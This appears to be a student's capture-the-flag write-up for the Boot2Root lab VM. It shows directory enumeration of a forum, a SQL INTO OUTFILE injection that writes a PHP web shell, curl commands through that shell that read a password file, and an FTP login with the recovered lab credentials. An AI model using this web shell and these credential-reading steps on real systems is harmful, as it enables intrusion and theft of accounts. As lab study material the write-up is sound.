# Boot2Root

## Get ssh credentials from the forum 

### When we are root on db we can execute arbitrary commands on ther machine.

First we need a directory with appropriate permissions:

let's find this with `python-dirserach` :

```
root@kali:~/Documents/dirsearch# ./dirsearch.py -u https://10.0.2.14/forum -e forum

 _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )

Extensions: forum | Threads: 10 | Wordlist size: 6046

Error Log: /root/Documents/dirsearch/logs/errors-18-10-22_11-20-55.log

Target: https://10.0.2.14/forum

[11:20:55] Starting:
[11:20:56] 403 -  295B  - /forum/.ht_wsr.txt
[11:20:56] 403 -  288B  - /forum/.hta
[11:20:56] 403 -  297B  - /forum/.htaccess-dev
[11:20:56] 403 -  297B  - /forum/.htaccess.BAK
[11:20:56] 403 -  299B  - /forum/.htaccess-local
[11:20:56] 403 -  299B  - /forum/.htaccess-marco
[...]
[11:21:02] 403 -  314B  - /forum/config/settings/production.yml
[11:21:05] 301 -  315B  - /forum/images  ->  https://10.0.2.14/forum/images/
[11:21:05] 301 -  317B  - /forum/includes  ->  https://10.0.2.14/forum/includes/
[11:21:05] 200 -    5KB - /forum/includes/
[11:21:05] 200 -    5KB - /forum/index
[11:21:05] 200 -    5KB - /forum/index.php
[11:21:05] 200 -    5KB - /forum/index.php/login/
[11:21:05] 301 -  311B  - /forum/js  ->  https://10.0.2.14/forum/js/
[11:21:06] 301 -  313B  - /forum/lang  ->  https://10.0.2.14/forum/lang/
[11:21:07] 301 -  316B  - /forum/modules  ->  https://10.0.2.14/forum/modules/
[11:21:10] 301 -  320B  - /forum/templates_c  ->  https://10.0.2.14/forum/templates_c/
[11:21:10] 200 -    6KB - /forum/templates_c/
[11:21:11] 301 -  315B  - /forum/themes  ->  https://10.0.2.14/forum/themes/
[11:21:11] 301 -  315B  - /forum/update  ->  https://10.0.2.14/forum/update/
```

`templates_c/` seems good let's give it a try :

- [X] SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/forum/templates_c/cmd.php"

`$ curl --insecure 'https://10.0.2.5/forum/templates_c/cmd.php?cmd=pwd'`

```
/var/www/forum/templates_c
```

`$ curl --insecure 'https://10.0.2.5/forum/templates_c/cmd.php?cmd=ls%20`
./../../../home'

```
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz
```

`$ curl --insecure 'https://10.0.2.5/forum/templates_c/cmd.php?cmd=cat%20`
../../../../home/LOOKATME/password'

```
lmezard:G!@M6f4Eatau{sF"
```

- [X] lmezard:G!@M6f4Eatau{sF"

### ftp 10.0.2.5
```
Connected to 10.0.2.5.
220 Welcome on this server
Name (10.0.2.5:root): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.02 secs (45.8398 MB/s)

```

exploit fun with the python script.
## We unlock the bomb !
